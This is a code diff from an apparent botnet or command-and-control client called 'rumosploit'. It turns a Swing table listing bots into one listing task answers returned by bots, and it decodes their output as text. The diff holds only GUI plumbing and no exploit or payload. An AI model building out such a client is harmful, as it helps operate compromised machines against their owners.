@@ -1,6 +1,7 @@
-package com.github.rumoel.rumosploit.client.gui.manage.bots;
+package com.github.rumoel.rumosploit.client.gui.task;
 
 import java.lang.reflect.Field;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.HashSet;
 import java.util.Set;
@@ -8,17 +9,17 @@ import java.util.Set;
 import javax.swing.event.TableModelListener;
 import javax.swing.table.TableModel;
 
-import com.github.rumoel.rumosploit.bot.BotEntity;
 import com.github.rumoel.rumosploit.client.header.Header;
+import com.github.rumoel.rumosploit.tasks.BotTaskAnswer;
 
-public class BotsTableModel implements TableModel {
+public class TasksTableModel implements TableModel {
 
 	private Set<TableModelListener> listeners = new HashSet<>();
 
 	private ArrayList<Field> fields = new ArrayList<>();
 
-	public BotsTableModel() {
-		Field[] arfields = BotEntity.class.getDeclaredFields();
+	public TasksTableModel() {
+		Field[] arfields = BotTaskAnswer.class.getDeclaredFields();
 		for (Field field : arfields) {
 			if (field.getName().contains("serialVersionUID")) {
 				continue;
@@ -49,9 +50,16 @@ public class BotsTableModel implements TableModel {
 
 	@Override
 	public Object getValueAt(int rowIndex, int columnIndex) {
-		BotEntity bean = Header.getBotEntities().get(rowIndex);
 		try {
-			return BotEntity.class.getField(fields.get(columnIndex).getName()).get(bean);
+			BotTaskAnswer bean = Header.getBotTaskAnswers().get(rowIndex);
+			Field field = BotTaskAnswer.class.getField(fields.get(columnIndex).getName());
+
+			Object data = field.get(bean);
+			if (field.getName().equals("output")) {
+				return new String((byte[]) data, StandardCharsets.UTF_8);
+			}
+
+			return data;
 		} catch (IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException e) {
 			e.printStackTrace();
 		}
@@ -60,7 +68,7 @@ public class BotsTableModel implements TableModel {
 
 	@Override
 	public int getRowCount() {
-		return Header.getBotEntities().size();
+		return Header.getBotTaskAnswers().size();
 	}
 
 	@Override
